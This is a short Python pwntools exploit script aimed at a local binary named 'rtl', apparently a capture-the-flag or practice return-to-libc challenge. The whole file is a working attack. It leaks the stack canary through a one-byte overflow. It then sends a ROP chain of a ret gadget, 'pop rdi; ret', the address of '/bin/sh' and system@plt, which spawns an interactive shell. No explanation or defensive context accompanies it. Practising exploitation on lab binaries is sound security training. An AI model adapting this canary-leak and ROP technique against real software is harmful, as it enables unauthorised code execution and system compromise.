from pwn import *

p = process('./rtl')
e = ELF('./rtl')
gdb.attach(p, api=True)

buf = b'a'*(0x40-0x8+1)
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))
log.info('Canary ' + hex(canary))
system = e.plt['system']
binsh = 0x400874 #search /bin/sh
rdi_ret = 0x0000000000400853 #ROPgadget --binary ./rtl | grep "pop rdi ; ret"
ret = 0x0000000000400285 #ROPgadget --binary ./rtl | grep "ret"

payload = b'a'*(0x40-0x8) + p64(canary) + b'a'*8
payload += p64(ret) #prevent error cause by movaps
payload += p64(rdi_ret) +p64(binsh) + p64(system) #system("/bin/sh")
p.sendafter(b'Buf: ', payload)

p.interactive()
